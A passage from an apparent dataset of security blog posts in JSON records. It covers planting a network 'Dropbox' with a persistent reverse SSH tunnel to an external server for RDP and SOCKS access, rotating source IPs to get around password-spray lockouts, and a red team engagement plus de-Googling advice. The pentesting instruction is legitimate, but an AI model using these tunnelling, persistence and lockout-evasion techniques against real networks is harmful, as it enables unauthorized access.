We could connect the Dropbox to the External system with the following SSH command.\n\nssh -i ~/.ssh/db.key -p 443 root@208.8.8.8\n\nNow we have a connection (tunnel) from the Dropbox to the External system. The arrow shows the direction of the connection.\n\nHowever, this isn\u2019t quite what we want. We want to be able to forward an RDP connection through this tunnel we just set up. To do this, we will tell SSH to start listening on an internal port, port 5001, and forward anything that connects to this internal port back through our SSH Tunnel. This is known as Reverse SSH Port Forwarding. It is \u201cReverse\u201d because the listening port is being created on the system we are SSH\u2019ing to and not on the system we are SSH\u2019ing from. The following command will set up the Reverse SSH Port Forward for us. In this command, the term \u201clocalhost\u201d is referring to the Dropbox which has the SSH service listening on port 22.\n\nssh -i ~/.ssh/db.key -p 443 -R 5001:localhost:22 root@208.8.8.8\n\nA green box around a port number designates that this port is listening on the local interface only. This port is not accessible by remote systems except through an SSH tunnel.\n\nA note on persistence. You may want to make sure that this SSH tunnel from the Dropbox to the external system stays connected. For example, you may have left the Dropbox on-site and no longer have command line access to it without using the tunnel. In this case, you should consider using the autossh command as shown below. If autossh is not installed you can follow the instructions here to install it.\n\nautossh -M 0 -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -i ~/.ssh/db.key -p 443 -R 5001:localhost:22 root@208.8.8.8\n\nAutossh is used to monitor and restart SSH sessions. The -M 0 option disables the monitoring port and instead uses the two \u201cAlive\u201d options to check the health of the connection. The ExitOnForwardFailure means that if autossh can\u2019t bind to the remote port, 5001 in this case, it will exit. This will make it obvious that the full connection we are seeking has not occurred.\n\nIf you are worried that the Dropbox may get restarted and you want to ensure that the SSH tunnel gets restarted you could install it as a service. This can be accomplished by creating the following file at /etc/systemd/system/autossh.service and then registering it as a service. Remember to replace 208.8.8.8 with the IP of your External server.\n\n[Unit]Description=Keeps a tunnel to External server openRequires=network-online.targetAfter=network-online.target[Service]User=rootEnvironment=\"AUTOSSH_GATETIME=0\"ExecStart=/usr/bin/autossh -M 0 -N -o ServerAliveInterval=30 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -i /root/.ssh/db.key -p 443 -R 5001:localhost:22 root@208.8.8.8[Install]WantedBy=multi-user.target\n\nThe following commands will read the new autssh.service file, start the service and check its status.\n\nsudo systemctl daemon-reloadsudo systemctl start autossh.servicesudo systemctl status autossh.service\n\nEnsure that the status shows as \u201cactive (running)\u201d as shown in the image below.\n\nFinally, set the service to start at boot, and make sure the SSH service also starts at boot.\n\nsudo systemctl enable autossh.servicesudo systemctl enable ssh\n\nNow you can try rebooting your Dropbox and confirm that the tunnel out to the External service is up and functional, including the reverse port forward back to the Dropbox.\n\nThe Dropbox is connected, now let\u2019s connect the Attacker system to the External System. First, we will set up two environment variables to make the final command easy to copy and paste. Replace the IP addresses in these two commands with the IP address of your External server and the Internal IP of the Target system. Run these commands from a cmd window on the Attacker system.\n\nset EXTERNAL_IP=208.8.8.8set TARGET_IP=10.2.2.222\n\nNow, in the same window where you set the above environment variables run the following command. Run this command from the directory that contains your attacker private key, at.ppk. If your key was generated in Linux, you can use Puttygen.exe to open the key and save it out in ppk format. If you run this command from a different directory than where your at.ppk file is, you\u2019ll need to provide the full path to the file such as \u201cc:\\Users\\admin\\.ssh\\at.ppk\u201d in both locations it is referenced in the command.\n\nplink -i at.ppk root@%EXTERNAL_IP% -P 5001 -L 3390:%TARGET_IP%:3389 -proxycmd \"plink root@%EXTERNAL_IP% -P 443 -i at.ppk -nc 127.0.0.1:5001\"\n\nIf you get an error that \u201cplink is not recognized as an internal or external command\u201d, copy plink.exe to the same directory you are running the command from (e.g. your .ssh directory).\n\nTo understand what this command is doing, we really need to look at it in reverse order. The first thing that happens is the command that follows \u201c-proxycmd\u201d is executed. The proxycmd portion of the command is shown below.\n\nplink root@%EXTERNAL_IP% -P 443 -i at.ppk -nc 127.0.0.1:5001\n\nThe state of our connection after just this proxycmd runs is shown below. The \u201c-nc\u201d portion of the command tells plink to open a tunnel to 127.0.0.1 port 5001 instead of a session.\n\nNext, we look at the first half of the plink link command. This actually runs after the proxycmd shown above.\n\nplink -i at.ppk root@%EXTERNAL_IP% -P 5001 -L 3390:%TARGET_IP%:3389\n\nThis SSH connection is established through the tunnel previously created with proxycmd. This is why it has access to the internal port listening on port 5001. The last part of the command uses the Local Port Forward option \u201c-L\u201d to send anything connecting to local port 3390 through the tunnel to port 3389 on the Target. After the full command runs, this is what we have created.\n\nNote that we chose local port 3390 because Windows complains with a \u201cYour computer could not connect to another console\u201d error as shown below if you try to connect to localhost 3389 with the RDP client.\n\nFinally, we can now RDP from our Attacker system to the Target system with the Windows built-in RDP client.\n\nFor the \u201cUser name\u201d field you can use \u201c.\\username\u201d to log in using a local account. If using a domain account, be sure to include the domain name followed by a backslash (e.g. \u201cintdomain\\carrie\u201d).\n\nInstead of trying to RDP to the internal network, what if we wanted to use an Internet Browser on our Attacker machine as if it was on the internal network. This can be done with the following modification to the plink command run from the Attacker system.\n\nplink -i at.ppk root@%EXTERNAL_IP% -P 5001 -D 9999 -proxycmd \"plink root@%EXTERNAL_IP% -P 443 -i at.ppk -nc 127.0.0.1:5001\"\n\nAfter executing this command, configure the browser on the Attacker system to use the socks proxy on localhost 9999. You can do this in Firefox by going to Settings (the hamburger menu in the upper right)-->Options, search for \u201cProxy\u201d and then click \u201cSettings\u2026\u201d next to \u201cConfigure how Firefox connects to the Internet\u201d.\n\nMake sure that \u201cSocks v5\u201d is selected, as well as \u201cProxy DNS when using SOCKS v5\u201d. Clear out anything listed in the \u201cNo Proxy for\u201d text box, then click OK. You can now browse the Internal network from a browser on your Attacker system as if the browser was on the Dropbox.\n\nYou could use the FoxyProxy addon to quickly change proxy servers in Firefox and Chrome. This is how you would configure this using FoxyProxy.\n\nChrome, IE, and Edge use the System Proxy settings. You could change the system proxy to point to your dynamic Socks proxy on port 9999 but you might be sending more traffic to the internal network than just your browser traffic, which may be undesirable. I recommend using Firefox because it manages its own proxy settings apart from the System proxy. Or, you can use the Foxyproxy Addon with either Firefox or Chrome to control the proxy directly.\n\nWe have finished out walkthrough using a Windows Attack system and a Linux Dropbox. For the next scenario, let\u2019s swap out the Windows Attacker system for a Linux one as shown in the image below.\n\nThe commands executed on the Dropbox are going to remain the same as in the first scenario. The only command this will change is the command executed from the Attacker system. From a terminal window on the Attacker system we define our IP addresses:\n\nEXTERNAL_IP=208.8.8.8TARGET_IP=10.2.2.222\n\nThen execute the following SSH command from the same terminal window.\n\nssh -i at.key root@127.0.0.1 -p 5001 -L 3390:$TARGET_IP:3389 -J root@$EXTERNAL_IP:443\n\nNow we have a full communication path from port 3390 on our Attacker machine all the way to port 3389 on our Target server. We can use any Linux RDP client to connect to our Target. For this example, I will use xfreerdp which can be installed with the following command. Xfreerdp is recommended over rdesktop because it readily supports NLA.\n\nsudo apt install freerdp2-x11\n\nTo connect to the Target server, we simply specify the username and the host we want to connect to and we will be prompted to enter the password for the user.\n\nxfreerdp /u:carrie /v:127.0.0.1:3390\n\nRemember to include the Active Directory domain name along with the username if you are connecting as a domain user.\n\nxfreerdp /u:intdomain\\carrie /v:127.0.0.1:3390\n\nAs an alternative to running the long SSH command above we can add the following to our SSH config file (/root/.ssh/config) on the Attacker system.\n\nHost external\n  Hostname 208.8.8.8\n User root\n  Port 443\n  IdentityFile ~/.ssh/at.key\nHost dropbox\n  Hostname 127.0.0.1\n  User root\n  Port 5001\n  ProxyCommand ssh external -W %h:%p\n  IdentityFile ~/.ssh/at.key\n\nWith our SSH config file in place, our command is simplified to the following for forwarding RDP to the Target system.\n\nssh -L 3390:$TARGET_IP:3389 dropbox\n\nOr, if we want to create a dynamic Socks proxy, use the following command. It allows us to use a browser on the Attack machine as if it was on the Target Internal network.\n\nssh -D 9999 dropbox\n\nThis completes our second scenario. Now let\u2019s switch out the Linux Dropbox with a Windows Dropbox. This could be a system we literally put on the Target Internal network or one that already existed that we now have access to execute commands on. The drawing below shows the starting point for this scenario.\n\nFirst, we\u2019ll set up a local port listen on 3390 and forward it to our Target on port 3389. Running this command required administrative access, which you can get by right-clicking on cmd.exe and selecting \u201crun as administrator\u201d.\n\nnetsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=3390 connectaddress=10.2.2.222 connectport=3389\n\nNow we have the following piece of the communication channel set up.\n\nHere are some netsh notes that you might like to know for later but don\u2019t run them now. To delete the rule we just added, change \u201cadd\u201d to delete in the command above.\n\nTo show the proxy rules use the \u201cshow all\u201d command\n\nnetsh interface portproxy show all\n\nAnd to clear out all of the port proxies use \u201creset\u201d\n\nnetsh interface portproxy reset\n\nNow we just need to execute the two commands we learned about earlier to complete the setup, one from the Dropbox and one from the Attacker system. From the Dropbox, run the following commands from the directory containing the at.ppk private key and the plink executable.\n\nset EXTERNAL_IP=208.8.8.8plink -i at.ppk root@%EXTERNAL_IP% -P 443 -L 5001:127.0.0.1:3390\n\nAt this point, we have the following pieces of the communication channel in place.  \n\nFrom the Attacker machine running Linux execute the commands below. Note that this assumes the SSH config file (/root/.ssh/config) described earlier in this tutorial has been created.\n\nTARGET_IP=10.2.2.222ssh -L 3390:$TARGET_IP:3389 dropbox\n\nNow we have the full communication path ready to go.\n\nFinally, RDP from the Attacker machine to the Target system. The example here uses xfreerdp.\n\nxfreerdp /u:intdomain\\carrie /v:127.0.0.1:3390\n\nAlternatively, instead of setting up for RDP access, we could set up for Browser access. This does not require administrative access to run commands on the Windows Dropbox. The \u201cnetsh interface portproxy \u2026\u201d command is not used in this case. From the Attacker system run the following command.\n\nssh -D 9999 dropbox\n\nLastly, configure your browser to use a Socks proxy on localhost 9999 after running this command. Remember, for this browsing option, we have no need for the \u201cnetsh interface portproxy \u2026\u201d command, therefore we can browse the Target Internal network without having administrative access to our Windows Dropbox\n\nThank you to Carrie Roberts for another terrific guest blog.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How To Rotate Your Source IP Address\"\nTaxonomies: \"External/Internal, How-To, Informational, Password Spray, Red Team, Red Team Tools, Web App, Bypass IP Filtering, Darin Roberts, Foxy Proxy, IP Rotation, password spray, ProxyCannon, ProxyMesh\"\nCreation Date: \"Tue, 19 Mar 2019 16:56:52 +0000\"\nDarin Roberts//\n\nIP-Go-Round \u2013 Source IP Rotation\n\nI was on an engagement recently that was blocking my password sprays based on my IP address.  If I made 3 incorrect requests from my IP, I was blocked out from making any other requests for 30 minutes. How annoying is that? It is a great form of security and it might stop attackers looking for a quick way in. But, this form of security shouldn\u2019t be viewed as a way to stop all password spraying. It won\u2019t stop a dedicated hacker, one really trying to get access to your environment.\n\nOne of the ways to bypass IP filtering is to use rotating source IPs. ProxyCannon is an amazing tool for automatically routing your traffic through multiple cloud servers to diversify the source IP addresses of your traffic. (Thank you #_shellIntel) . Check out this BHIS blog post that walks you through using ProxyCannon in conjunction with Burp Suite: https://www.blackhillsinfosec.com/using-burp-proxycannon/. However, I wanted to find something a little bit easier to use, so I did some research and found a service called ProxyMesh. It was pretty easy to set up and worked well for rotating source IP addresses during a password spray.\n\nAs part of the plan I signed up for, there are two proxy options.  One is a proxy that has 10 IPs that are based in the US.  The other option is one that is called \u201copen\u201d with 8,743 IPs. I tested speed and reliability with the open proxy and compared that to the US option.\n\nProxyMesh has multiple levels of payment options.  There is a 30-day free trial after your trial is up you can pay as low as $10 a month for the service.  Obviously the more you pay, the better service you get.  The information found for this blog was gathered using the $10 a month plan. If you buy a better plan, your numbers might be different.\n\nI used two ways to connect to ProxyMesh.  The first way was the FoxyProxy add-on in Chrome.  The second way was Burp Suite Pro.  Both methods work great, so depending on what you are trying to do, you can set it up either way.  I will show both methods.\n\nOpen FoxyProxy and set up a new proxy.  Here are the settings that I have for the open proxy. Note that credentials are required in the authentication section.\n\nUsing the other proxy in ProxyMesh is as simple as changing the Hostname from open.proxymesh.com to us-wa.proxymesh.com.  Now, every time I load a web page, it looks like the request will be coming from a different IP.  Here are a couple of samples.\n\nThat is pretty cool! However, it is very time consuming to run tests hitting the reload button and copying the numbers down. By using Burp Suite Pro to run my requests, I can more easily track the IPs. In order to use Burp, I need to configure the proxy settings.\n\nI intentionally left the destination host blank. After it has been added, you will see that it put in the wildcard, so that all destinations are using the proxy.\n\nFor the first trial using the open proxy, I ran trials with a sample size of 100 requests to get my IP address from a simple web request.  I used the default settings on burp, 5 threads, not throttled.  Out of 100 requests, I found that 7 failed with either a \u201cBad Request\u201d response or a timeout.  There were also 2 requests that returned a previously used IP.  These 100 requests took just under 1.5 minutes to complete.  I ran this same trial a total of 10 times and compiled the following results.\n\nThe IPs that were used more than once (Multiples) are minimal and don\u2019t worry me too much.  The errors were a little disturbing, but it wasn't too much work to sort the results and make those few requests again.  If it is a problem for you, then you might want to think of other options.\n\nFor informational purposes, the sample revealed the following countries for the source of the IPs and the number of times it was seen in a sample of 100 requests.  Note, the total does not equal 100 because of errors received.\n\nCountry Source for IP\n\nNumber of Times Seen\n\nUnited States\n\n25\n\nRussia\n\n10\n\nThailand\n\n4\n\nIndonesia\n\n4\n\nUnknown\n\n4\n\nBrazil\n\n4\n\nCanada\n\n3\n\nIran\n\n3\n\nUkraine\n\n3\n\nSouth Africa\n\n2\n\nKenya\n\n2\n\nGermany\n\n2\n\nFrance\n\n2\n\nEcuador\n\n2\n\nColombia\n\n2\n\nEgypt\n\n2\n\nTurkey\n\n1\n\nTaiwan\n\n1\n\nSerbia\n\n1\n\nRepublic of Korea\n\n1\n\nPoland\n\n1\n\nPalestine\n\n1\n\nNigeria\n\n1\n\nNetherlands\n\n1\n\nMalaysia\n\n1\n\nMacedonia\n\n1\n\nJapan\n\n1\n\nIreland\n\n1\n\nGreece\n\n1\n\nGhana\n\n1\n\nCambodia\n\n1\n\nBosnia and Herzegovina\n\n1\n\nArgentina\n\n1\n\nI changed the settings on the number of threads to 10 to see if that had any impact on the results.  It appeared that the errors and multiples were similar, and the time to complete the requests dropped from 1.5 minutes to around 45 seconds to complete.  Using more threads didn\u2019t appear to affect the stability of the proxy.  I changed the number of threads to 1 and again, the only change was the speed with which the requests processed.\n\nI then changed my proxy to the other option, the US-WA Proxy.\n\nThese results were quite different.  The 100 requests were much faster, completing in about 13 seconds with the default 5 threads and no throttling.  Because the proxy rotates through 10 IPs, all of the IPs were used multiple times.  The IPs used were duplicated from 6 to 14 times for the 100 requests.  Also, there were no errors returned, and each request returned an IP.\n\nUltimately, I found that this was an easy and inexpensive way to rotate source IPs.  Remember that engagement I was on that was blocking my password sprays?  By using ProxyMesh to rotate my IPs I was able to conduct my password spray.  While blocking multiple login attempts from one IP is a great security feature, it should not be relied on to completely mitigate the risk of password spraying.\n\nHave you found another rotating proxy that works well? Let us know and we\u2019ll check it out.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Purge Google and Start Over - Part 1\"\nTaxonomies: \"Author, Blue Team, General InfoSec Tips & Tricks, How-To, Informational, Mike Felch, Blue Team, cloud, Google, Mike Felch, privacy, Red Team\"\nCreation Date: \"Wed, 27 Mar 2019 16:27:11 +0000\"\nMike Felch//\n\nA Tale of Blue Destroying Red\n\nLet me start by sharing a story about a fairly recent red team engagement against a highly-secured technical customer that didn\u2019t end so well for me. Their SOC was well-equipped with sophisticated in-house anomaly detection tools, incredible visibility across the organization, and a tenacious incident response team. They were a Google customer and leveraged G Suite to handle their cloud-based business applications which immediately made me excited. I\u2019ve spent a considerable amount of time researching and learning how to weaponize Google products to target organizations, so I immediately had a number of different attack-path ideas ready and started on the journey.\n\nAfter my team and I successfully compromised credentials and bypassed two-factor using CredSniper, we immediately started laterally pivoting through Google applications looking for the typical company data. This is when we first learned about the anomaly detection systems because they were leveraging Google Groups to send distribution emails to technical teams which contained interesting security alerts and crontab command-line logs in the archives. Needless to say, they were heavily invested in Google technologies, which is why this story is important. It wasn\u2019t long before the customer, with the help of Google, identified our authentication activity as suspicious. Whether it was because of a device that was never seen before, a location completely different then all others, or because of the combination of heuristics - it triggered a set of internal processes that eventually led to verification with the employee and a full-fledged incident. We eventually compromised a few other accounts but even with a sophisticated system and an on-edge incident response team, they couldn\u2019t get inside our OODA loop. It turns out, the Google Admin API wasn\u2019t actually real-time and the logs were delayed by 15 minutes (I heard Google made it a priority to fix) which gave us enough of a head start to run rampant. After the engagement the customer told us they contacted Google\u2019s SOC for help (evidently they are a large Google customer) and over the course of 24 hours they worked in tandem tracking, burning, and destroying our work. I want to take a few moments and note that the detection and coordination between the customer and Google was spot on.  However, sometimes things can go a bit too far. As you will see.\n\nThe Power of Collaboration\n\nYou might be asking yourself why this background story is relevant. Within those 24 hours, Google SOC was able to track and correlate all my burner accounts, phones, and API tokens then suspend the accounts. This included personal and work accounts. Making matters worse, they also went ahead and reconciled the indicators of compromise to my work account, suspending it citing a violation of the terms and service. Our system admin re-enabled it the next day and they re-suspended it while suspending the system admin ability to re-enable it. Were they wrong? Probably not. Would I have done the same thing? More than likely. Trust me, Google\u2019s ability to track and correlate accounts is very, very good. Over the next few days, I realized the extent of the damage. I missed emails from customers in which Google bounced back, I was unable to access any of the resources where my Google account was the authenticated identity, my work calendar wasn\u2019t accessible leaving me without knowing my daily agenda, and I couldn\u2019t even burn the down-time watching my YouTube backlog! (LOL)\n\nIf the fall-out had happened at the organizational account level then that would have meant the entire business could have come to a screeching halt. Eventually, we were able to work with our customer and Google to resolve the misconceptions and alleged violations of the terms of service but not before I learned a valuable lesson. Over the next few weeks, my wife and I continually had authentication issues where Google account sessions across all devices would randomly require re-authentication. Laptops, televisions, thermostats, tablets, and more. It may have just been a timing fluke but the reality was unsettling. Were our home IP addresses flagged as malicious in Google systems?\n\nRaising Eyebrows\n\nThe ability of a technology giant to dominate every facet of my work life with a flip of a switch and at the discretion of their employees could have long-lasting implications within our industry if abused. I was informally provided information from the customer that Google SOC gave them links to Beau Bullock and I\u2019s calendar event injection research, which was the initial access vector. This explains that those triaging within Google SOC knew the technique, that Black Hills Information Security was a pentesting company, that I was a tester at the company, and that the origin of the technique was me. While the customer provided BHIS with authorization to include third-party accounts in-scope, Google doesn\u2019t seem to have a transparent pentesting approval process that informs them of activity but they have afforded general approval in their Security and Compliance page under the Penetration Testing section. \n\nSo did Google have enough information to limit the impact on my account? Even if they did, could they have managed this dilemma in a better way? Did I actually violate the Terms of Service? After all, they did agree that no TOS was violated before reinstating my account but it took an incredible amount of back and forth between all affected parties. The only two stipulations in Google\u2019s requirements for penetration testing is abiding by the Acceptable Use Policy and that their Google Cloud Terms of Service are not violated. Obviously violating anything anywhere can result in a ban of everything everywhere.\n\nThis ambiguity is just one thing that every tester needs to be aware of and hopefully is addressed in the very near future. In fact, this is an issue that all testers everywhere need to be aware of when testing any cloud-based services. We are in uncharted territory in respect to cloud testing. Many vendors have a policy that we are never to test their core services. Others, are much better to work with. We are using this series as a cautionary tale to other testers and companies.\n\nBegging the Question\n\nWith the rise of de-platforming, terms of service violations, and vague interpretations; what could this mean for the future of personal accounts that violate much more unclear terms of service? I\u2019m not waiting to find out. Check out part 2 where I systematically de-platform myself by purging Google from every facet of my personal life, my family, and all of my devices. The journey was an incredible undertaking that required extensive research and planning to avoid a number of subtle issues that could result in major headaches.\n\nHow to Purge Google and Start Over - Part 2\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Purge Google and Start Over - Part 2\"\nTaxonomies: \"Author, Blue Team, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Mike Felch, Blue Team, cloud, Google, Red Team\"\nCreation Date: \"Wed, 27 Mar 2019 16:27:30 +0000\"\nMike Felch//\n\nHow to Purge Google and Start Over - Part 1\n\nBrief Recap\n\nIn part 1, we discussed a red team engagement that went south when the Google SOC joined forces with the SOC of a customer leading to the dismantling of all our compromised accounts, throw-away accounts, and even my work account. My daily work life was impacted significantly that week and my home internet-connected devices that had Google sessions were regularly reset. I learned that I should probably reconsider how my own personal life consolidated all facets with Google and how I could be impacted by the technology giant in the event we didn\u2019t see eye to eye in the future. While their actions were absolutely merited and I agree the response taken was the safest risk reducer for the incident they encountered, it left a lingering and troublesome feeling in me.\n\nMost people that have known me for any length of time can tell you I\u2019ve been a die-hard Google fanboy for over 15 years. Every smart-phone I\u2019ve owned ran Android, almost every smart-device in my home ran Android or was owned by Google, and I was a heavy G Suite user. All my files were backed up to Google Drive, most of my online accounts used SSO with my Google account as primary, all my TOTP 2FA relied on Google Authenticator, and my phone number was even Google Voice. Needless to say, it was a lot to think about.\n\nPrioritizing Requirements\n\nI needed a goal. Breaking free from Google-related services and devices was a lofty goal but would it be achievable. I decided to also include migrating away from a GSM-based cell phone so I could avoid the attack surface of sim-swapping. Quick note, while there are lots of links to services and products, none of them are referral links and are only used to provide options.\n\nMy goals were:\n\nNo Google Services\n\nNo GSM Phone\n\nQuality Cell-phone Coverage\n\nMobile Device Selection\n\nThis was much more difficult than I previously considered. While there were a number of different mobile OS\u2019s around, some were no longer supported or just purely bad. While some of these are dead or no longer supported, I listed them so you don\u2019t have to waste time researching. The ones I looked into were:\n\nFireOS (Amazon\u2019s FirePhone but seems dead) \n\nPureOS (Purism)\n\nFirefox OS (died a while back)\n\nKaiOS (integrated with Google Assistant)\n\nUbuntu Touch (pretty good alternative)\n\nLightPhone 2 (wasn\u2019t released but would have been my 1st pick)\n\nWindows 10 Mobile (end of life this year)\n\nBlackberry/SilentPhone/Cryptophone (all run Android now)\n\niOS (I was vehemently against Apple at the time)\n\nAfter being extremely discontent with all of the available options, I ended up buying an iPhone which combined with a Macbook Pro, has truly revolutionized my entire digital life. My opposition to Apple wasn\u2019t because of its technology, I just didn\u2019t want to go from one giant to another.\n\nMulti-Factor Selection\n\nWhile selecting a TOTP 2FA solution is fairly straight forward, I wanted to take it a step further and also create a completely separate phone line for SMS-based 2FA. While some might consider it in the same category as prepper-level status, it definitely creates an extra step for an attacker when targeting backup SMS 2FA implementations. There are a number of TOTP options, as well as, VOIP providers that integrate additional phone numbers using apps. I didn\u2019t see much difference between most of the options but here are a few I considered:\n\nTOTP Apps\n\nAuthy\n\nDuo\n\nLastPass Authenticator\n\nVOIP Providers\n\nCloud Sim\n\nTelos\n\nOpenPhone\n\nSideline\n\nLine2\n\nEmail Selection\n\nChoosing a new mail provider was a big concern. I set out desiring full alias support because I wanted to create unique email addresses for separate categories. Communicating with people? New Email. Social profiles? New Email. Smart-phone apps? New email. iCloud? New email. Banking? New email. Security-related accounts? New email. Software licenses? New email. It probably sounds pretty crazy but using aliases you get the convenience of email consolidation with reduced risk of cross-contamination. It helps create isolation for people attempting to connect you and your social accounts and since I don\u2019t like my personal data being sold (and hate ads) I opted to pay for email. Could anything be as awesome as Gmail and the G Suite line of products? Maybe not but we could definitely satisfy our needs.\n\nThere are a number of mail providers available, some I considered are:\n\nProtonMail\n\nFastMail\n\nOffice 365\n\nZoho\n\niCloud (I didn\u2019t like all my eggs in one basket)\n\nThe email provider I decided to go with was FastMail. They have multiple plans available and you can even bring your own domain. It has built-in support for syncing contacts and calendars while at the same time file support similar to Google Drive. I did have a concern with my mail clients leaking my source IP address in each email header which typically happens when you aren\u2019t using a webmail client. A friend of mine at a fruit company pointed out that FastMail has an undisclosed SMTP port of 565 that strips the source IP address from all outbound email! They also have a decent mobile application which seems to be feature-full.\n\nMaking the Migration\n\nThere are a number of areas I overlooked when I began the journey so in an effort to create somewhat of a checklist for readers, here are some areas to remember:\n\nAccounts\n\nUpdate all site profiles with new email address\n\nUpdate Slack and other social apps\n\nUpdate other profiles using the email as a backup\n\nPhone\n\nMigrate phone files and images\n\nReinstall apps on new phone\n\nData\n\nBackup G Suite data\n\nBackup Google Drive files\n\nImport contacts\n\nImport calendar events\n\nSecurity\n\nRe-sync TOTP/Push 2FA token sessions\n\nUpdate profiles using SMS 2FA\n\nAccount Migration\n\nThere were a few tricks I used to expedite most of this process. The first major win was by using my password manager to maintain track of the accounts I\u2019ve updated with my new email addresses. This was convenient because it helped me make sure I covered all the accounts while also updating the password manager directly. Be careful though, sometimes password managers don\u2019t update email addresses automatically which can get tricky if you are using the family subscription for shared passwords. A very few sites didn\u2019t allow me to actually update my email address. You might want to also consider regenerating API tokens that you rely on for the accounts you updated the email address on. I ran into an instance where an API token I used heavily no longer worked after I updated my profile email.\n\nPhone Migration\n\nThis was probably one of the most straight-forward migrations. I made a simple list of the applications I had on my Android phone and made sure I reinstalled them on my new phone. Too bad there isn\u2019t an app that would have done this automatically, I really liked how Android would automatically sync apps on new devices I purchased. I didn\u2019t worry about syncing my files to my new phone since they are already backed up and I don\u2019t actively need them, plus as you will read next, I found a new solution for data storage.\n\nData Migration\n\nGoogle makes it really easy to download all your account data by visiting https://google.com/takeout but I strongly suggest syncing Google Drive separately. Large files create major head-aches and if you are a heavy user, the longer this process will take. The good thing about using Google Takeout is all of your Gmail will be downloaded too. The only problem I couldn\u2019t find a solution for was exporting my Google Books. Most of the books on my bookshelf were uploaded and for some reason, the download/export feature wasn\u2019t available for them anymore.\n\nFor storage, I opted to replace my home NAS with a Synology DS218play NAS and Seagate SATA drives then just stored everything locally instead of the cloud. I ended up purchasing double the space and running an SHR raid configuration. This is similar to a raid 1 configuration except it\u2019s a custom Synology raid type that allows mix and match of disk sizes while maintaining typical mirror redundancy in case of disk failure. There were numerous reasons for the selection of Synology but this Linux-based OS has a simplified user-interface with some really cool built-in applications from collaboration tools to drop-in replacements for my Google Photos and Google Drive needs (Moments and Drive apps). You can even backup your Google Drive directly! This beast is powerful and full of all kinds of useful applications for syncing data to and from cloud providers for the ultra-paranoid or downloading YouTube videos or Torrents.\n\nObviously, if you want to still play in the cloud for data, there are solutions:\n\nAWS S3\n\nAzure Storage\n\nDigital Ocean Spaces\n\nBox.com\n\nDropBox\n\nDon\u2019t forget to import your contacts and calendars to your new provider. Most contact apps rely on vCard or have import capabilities so it\u2019s fairly simple to do. The same with most calendars adopting the vCalendar standard so events universally work between providers. I used this opportunity to clear out my old contacts. \n\nSecurity Migration\n\nFinally, let\u2019s not forget all of those pesky TOTP token sessions in Google Authenticator and changing your phone number for all the profiles that poorly implement 2FA solutions by only offering SMS. You do use 2FA for all your accounts, right? \n\nI opted to go with 2 separate TOTP applications but they are all relatively the same. As a pentester and red teamer, I regularly encounter scenarios where I have to enroll 2FA during customer engagements. Something to consider is separating work and personal TOTP apps for 2FA. It\u2019s probably not that big of a deal unless you have OCD and prefer things in isolation, like me.\n\nRegarding SMS based 2FA, I\u2019ve heard all the pro-SMS 2FA and anti-SMS 2FA infosec Twitterverse arguments and while some might consider SMS better than nothing, I strongly disagree. I am extremely against SMS-based 2FA for primary and even backup 2FA. In the event you have a profile with only SMS 2FA enabled, be sure to update the profiles with your new phone number. There is no obvious way to identify which profiles use SMS 2FA unless the SMS messages in your messaging app contain what the code is actually for. Google and Microsoft provide a nice little message stating \u201cG-xxxxxx is your Google verification code\u201d and \u201cxxxxxx Use this code for Microsoft verification\u201d but it seems a lot of others are just a random SMS with a code. *shrug* If you are interested in a discussion on why I think SMS 2FA is insecure, unhealthy, and should be eliminated altogether -- feel free to reach out! :)\n\nWiping and Starting Over\n\nNow it\u2019s time to delete the Google account since everything is set up, migrated, and working properly. I didn\u2019t do this immediately because I was worried I might have missed something. Keeping the account for a few weeks but not actively using it turned out to be a great choice because there were a few instances where I needed to access my email which was configured as a backup for other profiles. It also gave me peace of mind knowing that I hadn\u2019t been actively using it and my transition away from Google was a success. While there are a number of Google devices that you may need to wipe, I will provide instructions for the ones I used:\n\nDelete Google Account\n\nFactory Reset Android devices\n\nFactory Reset Nest Thermostat\n\nFactory Reset Google Home\n\nFactory Reset Fire TV/Fire Stick\n\nFactory Reset Moto 360 Watch\n\nRemove Google Account from Sony TV\n\nFor some, avoiding Google services is going to be impossible. For instance, I have to use it for work so how do I get around intentionally giving up my data to Google? I decided that isolating where and how I use Google would require compartmentalizing authenticated Google sessions to my work laptop only. It creates a little head-ache not having work available on my cell phone but it creates a healthy work-life balance. For internet searches, I\u2019ve switched over to DuckDuckGo which happens to be a pretty good alternative.\n\nDon\u2019t forget to notify friends and family of your new contact number! I actually skipped this step because I figured there are plenty of ways to get a hold of me in an emergency and in most cases I talk to people frequent enough that they will get my new information eventually.\n\nDisposable Credit Cards\n\nSince diversifying my digital life across emails, phone numbers, and service providers has proven to be very productive, I also started using Privacy.com for online purchases. It allows me to connect my bank account then I generate single-use credit cards for each purchase. You can also generate merchant-specific cards that have a preset limit for monthly payments. This way, if a merchant gets breached the stolen credit card is useless. If selected, you can also spoof the transaction name on your bank statement to avoid your spouse seeing those gift purchases!\n\nFinal Thoughts\n\nAside from the reality that technology giants have inadvertently turned into puppeteers with the power to control behavior and literally listen to every area of our lives, there is actually another shadow creeping in the clouds that people know about but often overlook: the personal data brokering business. This arena is huge and the data they have been collecting, buying, selling, giving, and trading is staggering in size despite it being public information. By compartmentalizing your digital life, you can at least make it much more difficult for those targeting you. Oh, and I\u2019ll just leave this here https://www.thecreepyline.com, it\u2019s worth the watch. :)\n\nOne last thing, an interesting provision in article 17 of the EU GDPR forces technology companies to erase your data when requested. They are also required to notify the third-parties they provided your data to, so they can follow suit as well. If you are a US citizen reading this and were hoping to leverage GDPR then check out the Estonia eResidency program. :)\n\nIn the meantime, US citizens can leverage some recent laws passed in Vermont to identify most of the data brokers selling their data by accessing the Vermont business page, selecting the Business Type of Data Broker and searching, then selecting the Filing History and Filing Type for opt-out instructions. Maybe someone reading this will go through each one and track how to opt-out and make it easily accessible to everyone (thanks Bronwen!).\n\nThat\u2019s it! I hope this blog series was useful to you and that your journey at taking back control of your digital life goes smoothly.\n\nHow to Purge Google and Start Over - Part 1\n\n"
    },
    {
        "input": "",
        "instruction": "",
